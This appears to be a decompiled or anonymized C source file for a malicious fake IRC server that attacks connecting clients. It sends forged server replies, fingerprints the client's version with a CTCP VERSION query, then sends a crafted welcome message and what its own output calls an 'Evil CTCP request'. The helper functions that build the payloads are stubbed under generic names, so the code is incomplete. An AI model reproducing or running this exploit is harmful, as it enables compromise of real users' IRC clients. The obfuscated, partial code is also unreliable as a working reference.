#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  version ;

/* Variables and functions */
 char* HOSTNAME ; 
 char* HOST_FOUND ; 
 char* IDENT ; 
 char* PING ; 
 char* FUNC0 (char*) ; 
 char* FUNC1 (char*,char*) ; 
 scalar_t__ check_version ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (char*,int /*<<< orphan*/ ,int) ; 
 int FUNC5 (int,char*,int) ; 
 int FUNC6 (int,char*,int,...) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,char*,int,int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 char* FUNC9 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,int) ; 
 char* FUNC12 (char*,char*) ; 

void
FUNC13(int fd,char *host)
{
      int size;
      char buffer[1024],data[1024],request[512],version[512];
      char *ptr;

      size = FUNC6(fd,HOSTNAME,FUNC10(HOSTNAME),0);
      if(size < 0)
      {
          FUNC3(stderr,"[-] %s\n",FUNC9(errno));
          FUNC2(0);
      }
      FUNC7(1);

      size = FUNC6(fd,IDENT,FUNC10(IDENT),0);
      if(size < 0)
      {
          FUNC3(stderr,"[-] %s\n",FUNC9(errno));
          FUNC2(0);
      }
      FUNC7(1);

      size = FUNC6(fd,HOST_FOUND,FUNC10(HOST_FOUND),0);
      if(size < 0)
      {
          FUNC3(stderr,"[-] %s\n",FUNC9(errno));
          FUNC2(0);
      }
      FUNC7(1);

      FUNC3(stdout,"[%s] Fake replies sent.\n",host);

      size = FUNC6(fd,PING,FUNC10(PING),0);
      if(size < 0)
      {
          FUNC3(stderr,"[-] %s\n",FUNC9(errno));
          FUNC2(0);
      }

      FUNC3(stdout,"[%s] Ping sent.\n",host);

      size = FUNC5(fd,data,1024);
      if(FUNC12(data,"PONG"))
      {
          if(check_version)
          {
              FUNC4(version,0,512);
              FUNC4(request,0,512);

              FUNC3(stdout,"[%s] Looking up client version...\n",host);

              FUNC8(request,":x!x PRIVMSG %s: %cVERSION%c\n",host,0x01,0x01);

              size = FUNC6(fd,request,FUNC10(request),0);
              if(size < 0)
              {
                  FUNC3(stderr,"[-] %s\n",FUNC9(errno));
                  FUNC2(0);
              }
              FUNC4(data,0,1024);
              while(1)
              {
                  size = FUNC5(fd,data,1024);
                  if((ptr = FUNC12(data,"VERSION ")) != NULL)
                  {
                      FUNC4(version,0,512);
                      FUNC11(version,ptr+8,sizeof(version)-1);
                      version[sizeof(version)-1] = '\0';
                      FUNC3(stdout,"[%s] Client version: %s",host,version);
                      FUNC7(3);
                      break;
                  }
              }
          }

          FUNC11(buffer,FUNC1(host,version),1023);
          buffer[1023] = '\0';
          size = FUNC6(fd,buffer,1024);
          FUNC3(stdout,"[%s] Welcome message sent.\n",host);
          FUNC7(1);

          FUNC4(buffer,0,1024);
          FUNC11(buffer,FUNC0(host),1023);
          buffer[1023] = '\0';
          size = FUNC6(fd,buffer,1024);
          FUNC7(1);

          FUNC3(stdout,"[%s] Evil CTCP request sent.\n",host);
      }

      return;
}